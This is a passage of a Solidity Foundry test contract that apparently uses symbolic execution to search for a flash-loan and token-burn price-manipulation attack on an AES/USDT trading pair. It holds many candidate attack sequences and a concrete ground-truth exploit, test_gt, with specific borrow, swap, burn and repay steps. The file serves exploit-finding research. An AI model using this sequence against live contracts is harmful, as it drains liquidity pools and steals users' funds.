payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand031(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand032(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21,uint256 amt22,uint256 amt23) public {
vm.startPrank(attacker);
vm.assume(amt22 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
swap_pair_attacker_aes_usdt(amt10, amt11, amt12, amt13);
swap_pair_attacker_usdt_aes(amt14, amt15, amt16, amt17);
swap_pair_attacker_aes_usdt(amt18, amt19, amt20, amt21);
payback_usdt_owner(amt22, amt23);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand033(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand034(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand035(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand036(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand037(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21,uint256 amt22,uint256 amt23) public {
vm.startPrank(attacker);
vm.assume(amt22 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
swap_pair_attacker_aes_usdt(amt8, amt9, amt10, amt11);
swap_pair_attacker_usdt_aes(amt12, amt13, amt14, amt15);
burn_aes_pair(amt16, amt17);
swap_pair_attacker_aes_usdt(amt18, amt19, amt20, amt21);
payback_usdt_owner(amt22, amt23);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand038(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21,uint256 amt22,uint256 amt23) public {
vm.startPrank(attacker);
vm.assume(amt22 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
swap_pair_attacker_aes_usdt(amt8, amt9, amt10, amt11);
swap_pair_attacker_usdt_aes(amt12, amt13, amt14, amt15);
burn_aes_pair(amt16, amt17);
swap_pair_attacker_aes_usdt(amt18, amt19, amt20, amt21);
payback_usdt_owner(amt22, amt23);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand039(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21,uint256 amt22,uint256 amt23) public {
vm.startPrank(attacker);
vm.assume(amt22 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
swap_pair_attacker_aes_usdt(amt10, amt11, amt12, amt13);
swap_pair_attacker_usdt_aes(amt14, amt15, amt16, amt17);
swap_pair_attacker_aes_usdt(amt18, amt19, amt20, amt21);
payback_usdt_owner(amt22, amt23);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand040(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand041(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand042(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand043(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand044(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19,uint256 amt20,uint256 amt21,uint256 amt22,uint256 amt23) public {
vm.startPrank(attacker);
vm.assume(amt22 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
swap_pair_attacker_aes_usdt(amt10, amt11, amt12, amt13);
swap_pair_attacker_usdt_aes(amt14, amt15, amt16, amt17);
swap_pair_attacker_aes_usdt(amt18, amt19, amt20, amt21);
payback_usdt_owner(amt22, amt23);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand045(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand046(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand047(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_cand048(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6,uint256 amt7,uint256 amt8,uint256 amt9,uint256 amt10,uint256 amt11,uint256 amt12,uint256 amt13,uint256 amt14,uint256 amt15,uint256 amt16,uint256 amt17,uint256 amt18,uint256 amt19) public {
vm.startPrank(attacker);
vm.assume(amt18 >= amt0);
borrow_usdt_owner(amt0, amt1);
swap_pair_attacker_usdt_aes(amt2, amt3, amt4, amt5);
burn_aes_pair(amt6, amt7);
burn_aes_pair(amt8, amt9);
burn_aes_pair(amt10, amt11);
burn_aes_pair(amt12, amt13);
swap_pair_attacker_aes_usdt(amt14, amt15, amt16, amt17);
payback_usdt_owner(amt18, amt19);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function test_gt() public {
vm.startPrank(attacker);
emit log_named_uint("amt0", 100000e18);
borrow_usdt_owner(100000e18);
printBalance("After step0 ");
emit log_named_uint("amt1", usdt.balanceOf(attacker));
emit log_named_uint("amt2", pair.getAmountOut(usdt.balanceOf(attacker), address(usdt)));
swap_pair_attacker_usdt_aes(usdt.balanceOf(attacker), pair.getAmountOut(usdt.balanceOf(attacker), address(usdt)));
printBalance("After step1 ");
emit log_named_uint("amt3", 0);
burn_aes_pair(0);
printBalance("After step2 ");
emit log_named_uint("amt4", aes.balanceOf(attacker));
emit log_named_uint("amt5", pair.getAmountOut(aes.balanceOf(attacker), address(aes)) * 9 / 10);
swap_pair_attacker_aes_usdt(aes.balanceOf(attacker), pair.getAmountOut(aes.balanceOf(attacker), address(aes)) * 9 / 10);
printBalance("After step3 ");
emit log_named_uint("amt6", 100000e18 * 1003 / 1000);
payback_usdt_owner(100000e18 * 1003 / 1000);
printBalance("After step4 ");
require(attackGoal(), "Attack failed!");
vm.stopPrank();
}
function check_gt(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6) public {
vm.startPrank(attacker);
vm.assume(amt6 >= amt0);
borrow_usdt_owner(amt0);
swap_pair_attacker_usdt_aes(amt1, amt2);
burn_aes_pair(amt3);
swap_pair_attacker_aes_usdt(amt4, amt5);
payback_usdt_owner(amt6);
require(!attackGoal(), "Attack succeed!");
vm.stopPrank();
}
function check_gt_halmos(uint256 amt0,uint256 amt1,uint256 amt2,uint256 amt3,uint256 amt4,uint256 amt5,uint256 amt6) public {
vm.startPrank(attacker);
vm.assume(amt6 >= amt0);
borrow_usdt_owner(amt0);
swap_pair_attacker_usdt_aes(amt1, amt2);
burn_aes_pair(amt3);
swap_pair_attacker_aes_usdt(amt4, amt5);
payback_usdt_owner(amt6);
assert(!attackGoal());
vm.stopPrank();
}
}
